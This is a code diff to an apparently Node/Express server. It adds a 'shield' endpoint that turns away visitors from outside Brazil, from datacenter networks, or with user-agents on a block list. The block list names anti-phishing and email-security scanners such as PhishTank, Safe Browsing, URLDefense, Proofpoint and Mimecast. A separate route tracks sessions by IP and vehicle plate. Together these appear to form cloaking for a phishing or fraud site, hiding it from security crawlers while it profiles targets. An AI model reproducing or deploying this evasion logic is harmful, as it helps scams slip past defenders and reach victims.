@@ -295,6 +295,87 @@ function saveEvents() {
     ghSave([...events]).catch(() => {});
 }
 
+// ---------- SHIELD (Anti-bot / Geo-block / Datacenter) ----------
+
+const geoCache = new Map();
+const GEO_TTL = 3600000; // 1h cache
+
+const BOT_UA = [
+    'bot','crawler','spider','scraper','scan','check','monitor',
+    'curl','wget','python','go-http','java/','perl/','ruby','php/',
+    'phantom','headless','puppeteer','playwright','selenium','webdriver',
+    'googlebot','bingbot','yandex','baidu','duckduck',
+    'facebookexternalhit','twitterbot','linkedinbot','slackbot','telegrambot','whatsapp',
+    'barracuda','proofpoint','symantec','forcepoint','mimecast',
+    'safelinks','safebrowsing','phishtank','url protection','urldefense',
+    'messagelabs','spamhaus','fortiguard','websense',
+    'semrush','ahrefs','majestic','moz.com','bytespider',
+    'censys','shodan','nmap','nikto','sqlmap','masscan',
+    'postman','insomnia','httpie','axios/','node-fetch','undici',
+    'preview','archiv','dispatch','applebot','petalbot',
+    'mail.ru','seznam','sogou','exabot','ia_archiver',
+];
+
+const DC_ISP = [
+    'amazon','aws','ec2','google cloud','gcp','microsoft','azure',
+    'digitalocean','ovh','hetzner','linode','akamai','vultr',
+    'oracle cloud','cloudflare','contabo','hostgator','godaddy',
+    'bluehost','rackspace','scaleway','upcloud','kamatera',
+    'leaseweb','cogent','choopa','serverius','quadranet','psychz',
+    'colocrossing','hostwinds','ionos','fastly','incapsula',
+    'sucuri','stackpath','m247','datacamp','zscaler',
+    'fortinet','palo alto','barracuda networks',
+];
+
+function isBotUA(ua) {
+    const l = (ua || '').toLowerCase();
+    if (!l || l.length < 15) return true; // UA vazio ou muito curto = bot
+    return BOT_UA.some(p => l.includes(p));
+}
+
+function isDCProvider(isp, org) {
+    const c = ((isp || '') + ' ' + (org || '')).toLowerCase();
+    return DC_ISP.some(p => c.includes(p));
+}
+
+async function getGeo(ip) {
+    if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
+    const cached = geoCache.get(ip);
+    if (cached && Date.now() - cached.ts < GEO_TTL) return cached.data;
+    try {
+        const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,hosting`);
+        if (!r.ok) return null;
+        const data = await r.json();
+        if (data.status === 'fail') return null;
+        geoCache.set(ip, { data, ts: Date.now() });
+        // Limpar cache antigo
+        if (geoCache.size > 10000) {
+            const old = [...geoCache.entries()].sort((a, b) => a[1].ts - b[1].ts).slice(0, 5000);
+            old.forEach(([k]) => geoCache.delete(k));
+        }
+        return data;
+    } catch(_) { return null; }
+}
+
+app.get('/api/shield', requireInternalKey, async (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
+    const ua = req.headers['user-agent'] || '';
+
+    // 1. Bot User-Agent
+    if (isBotUA(ua)) return res.json({ ok: false, r: 'ua' });
+
+    // 2. Geo — só Brasil
+    const geo = await getGeo(ip);
+    if (!geo) return res.json({ ok: true }); // Fail-open se geo falhar
+    if (geo.countryCode !== 'BR') return res.json({ ok: false, r: 'geo' });
+
+    // 3. Datacenter / hosting provider
+    if (geo.hosting === true) return res.json({ ok: false, r: 'dc' });
+    if (isDCProvider(geo.isp, geo.org)) return res.json({ ok: false, r: 'dc' });
+
+    res.json({ ok: true });
+});
+
 // ---------- WEBHOOK ----------
 app.post('/api/webhook', (req, res) => {
     const data = req.body || {};
@@ -334,12 +415,8 @@ app.post('/api/track', async (req, res) => {
     let session = findSession(ip, placa || '');
 
     if (!session) {
-        // Fetch geo only on new session
-        let geo = {};
-        try {
-            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp`);
-            if (geoRes.ok) geo = await geoRes.json();
-        } catch (_) {}
+        // Usa getGeo cacheado (compartilha cache com shield)
+        const geo = await getGeo(ip) || {};
 
         session = {
             id: Date.now() + Math.random(),
